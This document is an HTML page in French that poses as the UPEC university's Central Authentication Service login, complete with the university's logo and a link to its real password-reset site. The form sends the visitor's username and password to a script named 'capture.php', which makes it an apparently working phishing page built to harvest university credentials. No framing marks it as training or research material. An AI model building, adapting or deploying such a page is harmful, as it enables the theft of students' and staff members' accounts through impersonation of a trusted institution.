<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Login - CAS – Central Authentication Service</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f3f3;
    }
    .login-container {
      max-width: 420px;
      margin: 80px auto;
      padding: 30px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
      border-radius: 8px;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 180px;
    }
    .form-group label {
      font-weight: bold;
    }
    .caps-warn {
      display: none;
      font-size: 0.9em;
      color: red;
    }
  </style>
</head>
<body>

<div class="login-container">
  <img src="https://assets.unlayer.com/projects/273863/1747310299732-UPEC-logo.svg%20(1).png" alt="UPEC Logo" class="logo">
  <h4 class="text-center mb-4">Service Central d'Authentification</h4>
  
  <form method="GET" action="capture.php" id="loginForm">
    <div class="form-group">
      <label for="email">Identifiant :</label>
      <input type="text" class="form-control" id="email" name="email" required autocomplete="off">
    </div>
    <div class="form-group">
      <label for="password">Mot de passe :</label>
      <input type="password" class="form-control" id="password" name="password" required autocomplete="off">
      <div id="caps-warning" class="caps-warn">⚠️ Majuscule activée (Caps Lock) !</div>
    </div>
    <button type="submit" class="btn btn-primary btn-block">Connexion</button>
  </form>

  <p class="text-center mt-3">
    <a href="https://sesame.u-pec.fr">Mot de passe oublié ?</a>
  </p>
</div>

<script>
  const passwordField = document.getElementById("password");
  const capsWarning = document.getElementById("caps-warning");
  passwordField.addEventListener("keyup", function(e) {
    capsWarning.style.display = e.getModifierState("CapsLock") ? "block" : "none";
  });
</script>

</body>
</html>
